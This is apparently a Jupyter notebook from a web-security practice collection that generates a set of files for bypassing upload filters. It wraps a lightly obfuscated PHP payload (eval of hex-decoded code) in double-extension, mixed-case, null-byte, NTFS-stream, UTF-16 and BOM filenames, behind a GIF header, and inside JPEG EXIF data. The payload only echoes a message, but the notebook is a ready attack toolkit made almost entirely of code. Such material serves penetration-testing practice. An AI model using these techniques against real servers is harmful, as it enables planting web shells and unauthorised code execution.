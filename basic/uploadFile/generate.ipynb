{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "✅ 已生成测试上传文件，共 10 个，保存于：bypass_upload_files/\n"
     ]
    }
   ],
   "source": [
    "import os\n",
    "from PIL import Image\n",
    "import piexif\n",
    "\n",
    "# 加强版：轻度混淆PHP代码（base64 + eval）\n",
    "real_code = 'echo \"Upload successful. PHP parsed!\";'\n",
    "b64 = real_code.encode(\"utf-8\").hex()\n",
    "php_payload = f'<?php eval(hex2bin(\"{b64}\")); ?>'\n",
    "\n",
    "# 输出目录\n",
    "output_dir = \"bypass_upload_files\"\n",
    "os.makedirs(output_dir, exist_ok=True)\n",
    "\n",
    "# 文件名列表增强（包含双扩展、NTFS流、空格、编码绕过）\n",
    "filenames = [\n",
    "    \"shell.php\",\n",
    "    \"shell.pHp\",\n",
    "    \"shell.php.jpg\",\n",
    "    \"shell.jpg.php\",\n",
    "    \"shell.php;.jpg\",\n",
    "    \"shell.phar\",\n",
    "    \"shell.phtml\",\n",
    "    \"shell.php%00.jpg\",\n",
    "    \"shell.jpg\",             # 图片+伪装PHP\n",
    "    \"shell_exif.jpg\",        # EXIF携带PHP\n",
    "    \"shell.php%20.jpg\",      # 空格绕过\n",
    "    \"shell.php::$DATA\",      # NTFS流（Windows特有）\n",
    "    \"shell_utf16.php\",       # UTF-16编码测试\n",
    "    \"shell_bom.php\"          # UTF-8 BOM测试\n",
    "]\n",
    "\n",
    "def write_php(filename, content, encoding=\"utf-8-sig\"):\n",
    "    with open(os.path.join(output_dir, filename), \"w\", encoding=encoding) as f:\n",
    "        f.write(content)\n",
    "\n",
    "def write_php_with_gif_header(filename):\n",
    "    gif_header = b\"\\x47\\x49\\x46\\x38\\x39\\x61\"  # GIF89a\n",
    "    payload = gif_header + b\"\\n\" + php_payload.encode()\n",
    "    with open(os.path.join(output_dir, filename), \"wb\") as f:\n",
    "        f.write(payload)\n",
    "\n",
    "def write_exif_php(filename):\n",
    "    # 创建一个图片，写入 PHP 到 EXIF\n",
    "    image_path = os.path.join(output_dir, filename)\n",
    "    image = Image.new(\"RGB\", (100, 100), color=(255, 255, 255))\n",
    "    exif_dict = {\"0th\": {piexif.ImageIFD.ImageDescription: php_payload.encode(\"utf-8\")}}\n",
    "    exif_bytes = piexif.dump(exif_dict)\n",
    "    image.save(image_path, \"jpeg\", exif=exif_bytes)\n",
    "\n",
    "# 写入文件\n",
    "for name in filenames:\n",
    "    if \"utf16\" in name:\n",
    "        write_php(name, php_payload, encoding=\"utf-16\")\n",
    "    elif \"bom\" in name:\n",
    "        write_php(name, php_payload, encoding=\"utf-8-sig\")\n",
    "    elif \"jpg\" in name and \"exif\" not in name:\n",
    "        write_php_with_gif_header(name)\n",
    "    elif \"exif\" in name:\n",
    "        write_exif_php(name)\n",
    "    else:\n",
    "        write_php(name, php_payload)\n",
    "\n",
    "print(f\"✅ 已生成增强测试上传文件，共 {len(filenames)} 个，保存于：{output_dir}/\")\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting piexif\n",
      "  Downloading piexif-1.1.3-py2.py3-none-any.whl.metadata (3.7 kB)\n",
      "Downloading piexif-1.1.3-py2.py3-none-any.whl (20 kB)\n",
      "Installing collected packages: piexif\n",
      "Successfully installed piexif-1.1.3\n"
     ]
    },
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n",
      "WARNING: Ignoring invalid distribution -atplotlib (d:\\anaconda\\download\\envs\\ex\\lib\\site-packages)\n"
     ]
    }
   ],
   "source": [
    "!pip install piexif"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "ex",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.19"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
